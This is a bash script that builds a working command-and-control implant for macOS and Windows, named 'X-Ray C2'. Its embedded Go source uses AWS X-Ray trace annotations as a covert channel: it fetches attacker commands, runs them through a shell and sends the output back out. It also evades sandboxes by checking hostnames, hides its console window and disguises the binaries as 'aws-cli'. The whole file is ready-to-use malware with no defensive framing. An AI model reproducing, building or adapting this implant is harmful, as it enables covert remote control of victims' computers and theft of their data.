#!/bin/bash

echo "====================================="
echo "  X-Ray C2 Standalone Builder"
echo "  @RandomDhiraj"
echo "====================================="
echo ""

echo "Enter AWS credentials to embed in implants:"
read -p "AWS Access Key ID: " ACCESS_KEY
read -s -p "AWS Secret Access Key: " SECRET_KEY
echo ""
echo ""

if [ -z "$ACCESS_KEY" ] || [ -z "$SECRET_KEY" ]; then
    echo "[-] Error: Credentials cannot be empty"
    exit 1
fi

mkdir -p builds

# -------------------------------
# Write implant code to file
# -------------------------------
cat > implant_standalone.go << 'EOF'
package main

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

const (
	accessKey = "REPLACE_ACCESS_KEY"
	secretKey = "REPLACE_SECRET_KEY"
	region    = "eu-west-1"
	service   = "xray"
)

type AWSTraceSegment struct {
	Name        string            `json:"name"`
	ID          string            `json:"id"`
	TraceID     string            `json:"trace_id"`
	StartTime   float64           `json:"start_time"`
	EndTime     float64           `json:"end_time"`
	Annotations map[string]string `json:"annotations"`
}

var processedRequestIds = make(map[string]bool)

func validateEnvironment() bool {
	hostname, _ := os.Hostname()
	bad := []string{"sandbox", "virus", "malware", "vmware", "analysis"}
	for _, s := range bad {
		if strings.Contains(strings.ToLower(hostname), s) {
			return false
		}
	}
	return true
}

func generateRequestId(n int) string {
	b := make([]byte, n/2)
	rand.Read(b)
	return hex.EncodeToString(b)[:n]
}

func executeSystemCommand(command string) string {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd", "/c", command)
	default:
		cmd = exec.Command("sh", "-c", command)
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\n%s", err, out)
	}
	
	// Handle large outputs that might exceed X-Ray annotation limits
	result := string(out)
	maxSize := 64000 // AWS X-Ray annotation value limit is ~64KB
	
	if len(result) > maxSize {
		// Truncate with indication
		truncated := result[:maxSize-200] // Leave room for message
		return truncated + "\n\n[... OUTPUT TRUNCATED - Use 'head/tail' commands for large files ...]"
	}
	
	return result
}

func computeHMACSHA256(key []byte, data []byte) []byte {
	h := hmac.New(sha256.New, key)
	h.Write(data)
	return h.Sum(nil)
}

func signAWSRequest(request *http.Request, body []byte) {
	now := time.Now().UTC()
	datestamp := now.Format("20060102")
	timestamp := now.Format("20060102T150405Z")

	// Create canonical request
	hasher := sha256.New()
	hasher.Write(body)
	payloadHash := hex.EncodeToString(hasher.Sum(nil))

	request.Header.Set("Host", request.URL.Host)
	request.Header.Set("X-Amz-Date", timestamp)
	request.Header.Set("Content-Type", "application/x-amz-json-1.1")

	canonicalHeaders := fmt.Sprintf("content-type:%s\nhost:%s\nx-amz-date:%s\n",
		request.Header.Get("Content-Type"),
		request.Header.Get("Host"),
		timestamp)

	signedHeaders := "content-type;host;x-amz-date"

	canonicalRequest := fmt.Sprintf("%s\n%s\n%s\n%s\n%s\n%s",
		request.Method,
		request.URL.Path,
		request.URL.RawQuery,
		canonicalHeaders,
		signedHeaders,
		payloadHash)

	// Create string to sign
	algorithm := "AWS4-HMAC-SHA256"
	credentialScope := fmt.Sprintf("%s/%s/%s/aws4_request", datestamp, region, service)

	h := sha256.New()
	h.Write([]byte(canonicalRequest))
	canonicalRequestHash := hex.EncodeToString(h.Sum(nil))

	stringToSign := fmt.Sprintf("%s\n%s\n%s\n%s",
		algorithm,
		timestamp,
		credentialScope,
		canonicalRequestHash)

	// Calculate signature
	kDate := computeHMACSHA256([]byte("AWS4"+secretKey), []byte(datestamp))
	kRegion := computeHMACSHA256(kDate, []byte(region))
	kService := computeHMACSHA256(kRegion, []byte(service))
	kSigning := computeHMACSHA256(kService, []byte("aws4_request"))
	signature := hex.EncodeToString(computeHMACSHA256(kSigning, []byte(stringToSign)))

	// Add authorization header
	authorization := fmt.Sprintf("%s Credential=%s/%s, SignedHeaders=%s, Signature=%s",
		algorithm,
		accessKey,
		credentialScope,
		signedHeaders,
		signature)

	request.Header.Set("Authorization", authorization)
}

func publishMetrics(instanceId string, response string) error {
	segment := AWSTraceSegment{
		Name:      "aws-application-monitoring",
		ID:        generateRequestId(16),
		TraceID:   fmt.Sprintf("1-%x-%s", time.Now().Unix(), generateRequestId(24)),
		StartTime: float64(time.Now().Unix()),
		EndTime:   float64(time.Now().Unix()) + 0.1,
		Annotations: map[string]string{
			"service_type": "health_check",
			"instance_id":  instanceId,
			"platform":     runtime.GOOS,
		},
	}

	if response != "" {
		segment.Annotations["execution_result"] = base64.StdEncoding.EncodeToString([]byte(response))
	}

	segmentJSON, _ := json.Marshal(segment)

	payload := map[string]interface{}{
		"TraceSegmentDocuments": []string{string(segmentJSON)},
	}

	body, _ := json.Marshal(payload)

	url := fmt.Sprintf("https://xray.%s.amazonaws.com/TraceSegments", region)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(body))
	if err != nil {
		return err
	}

	signAWSRequest(req, body)

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}

func pollConfiguration(instanceId string) (string, error) {
	endTime := time.Now().Unix()
	startTime := endTime - 300

	payload := map[string]interface{}{
		"StartTime": startTime,
		"EndTime":   endTime,
	}

	body, _ := json.Marshal(payload)

	url := fmt.Sprintf("https://xray.%s.amazonaws.com/TraceSummaries", region)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(body))
	if err != nil {
		return "", err
	}

	signAWSRequest(req, body)

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	respBody, _ := ioutil.ReadAll(resp.Body)

	var response struct {
		TraceSummaries []struct {
			Annotations map[string][]struct {
				AnnotationValue struct {
					StringValue string `json:"StringValue"`
				} `json:"AnnotationValue"`
			} `json:"Annotations"`
		} `json:"TraceSummaries"`
	}

	if err := json.Unmarshal(respBody, &response); err != nil {
		return "", err
	}

	configKey := fmt.Sprintf("config_%s", instanceId)

	for _, trace := range response.TraceSummaries {
		if configData, exists := trace.Annotations[configKey]; exists && len(configData) > 0 {
			encodedConfig := configData[0].AnnotationValue.StringValue
			if encodedConfig != "" {
				decoded, err := base64.StdEncoding.DecodeString(encodedConfig)
				if err == nil {
					configStr := string(decoded)
					parts := strings.SplitN(configStr, ":", 2)
					if len(parts) == 2 {
						requestId := parts[0]
						command := parts[1]

						if !processedRequestIds[requestId] {
							processedRequestIds[requestId] = true
							return command, nil
						}
					}
				}
			}
		}
	}

	return "", nil
}

func main() {
	if !validateEnvironment() {
		os.Exit(0)
	}

	rand.Seed(time.Now().UnixNano())
	time.Sleep(time.Duration(5+rand.Intn(10)) * time.Second)

	instanceId := generateRequestId(8)

	for {
		publishMetrics(instanceId, "")

		cmd, _ := pollConfiguration(instanceId)
		if cmd != "" {
			if cmd == "exit" {
				os.Exit(0)
			}

			result := executeSystemCommand(cmd)
			
			// Handle multi-part responses for very large outputs
			maxChunkSize := 32000 // Conservative chunk size
			if len(result) > maxChunkSize {
				// Send in chunks
				chunks := (len(result) + maxChunkSize - 1) / maxChunkSize
				for i := 0; i < chunks; i++ {
					start := i * maxChunkSize
					end := start + maxChunkSize
					if end > len(result) {
						end = len(result)
					}
					
					chunk := result[start:end]
					if chunks > 1 {
						chunk = fmt.Sprintf("[Part %d/%d]\n%s", i+1, chunks, chunk)
					}
					
					publishMetrics(instanceId, chunk)
					time.Sleep(time.Duration(2+rand.Intn(3)) * time.Second) // Small delay between chunks
				}
			} else {
				publishMetrics(instanceId, result)
			}
		}

		sleepTime := 30 + rand.Intn(30)
		time.Sleep(time.Duration(sleepTime) * time.Second)
	}
}
EOF

# Replace credentials inside implant
sed -i.bak "s#REPLACE_ACCESS_KEY#$ACCESS_KEY#g" implant_standalone.go
sed -i.bak "s#REPLACE_SECRET_KEY#$SECRET_KEY#g" implant_standalone.go
rm -f implant_standalone.go.bak

# -------------------------------
# macOS amd64 build
# -------------------------------
echo ""
echo "[*] Building macOS (amd64) implant..."
GOOS=darwin GOARCH=amd64 go build -ldflags="-s -w" -o builds/aws-cli-macos-amd64 implant_standalone.go
if [ $? -eq 0 ]; then
    echo "[+] Built: builds/aws-cli-macos-amd64 ($(ls -lh builds/aws-cli-macos-amd64 | awk '{print $5}'))"
else
    echo "[-] macOS amd64 build failed"
    exit 1
fi

# -------------------------------
# macOS arm64 build
# -------------------------------
echo ""
echo "[*] Building macOS (arm64) implant..."
GOOS=darwin GOARCH=arm64 go build -ldflags="-s -w" -o builds/aws-cli-macos-arm64 implant_standalone.go
if [ $? -eq 0 ]; then
    echo "[+] Built: builds/aws-cli-macos-arm64 ($(ls -lh builds/aws-cli-macos-arm64 | awk '{print $5}'))"
else
    echo "[-] macOS arm64 build failed"
    exit 1
fi

# -------------------------------
# Windows amd64 build
# -------------------------------
echo ""
echo "[*] Building Windows (amd64) implant..."
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o builds/aws-cli.exe implant_standalone.go
if [ $? -eq 0 ]; then
    echo "[+] Built: builds/aws-cli.exe ($(ls -lh builds/aws-cli.exe | awk '{print $5}'))"
else
    echo "[-] Windows build failed"
    exit 1
fi

# -------------------------------
# Cleanup
# -------------------------------
echo ""
echo "[*] Cleaning up..."
rm -f implant_standalone.go

echo ""
echo "====================================="
echo "BUILD COMPLETE."
echo ""
echo "  - builds/aws-cli-macos-amd64"
echo "  - builds/aws-cli-macos-arm64"
echo "  - builds/aws-cli.exe"
echo "====================================="
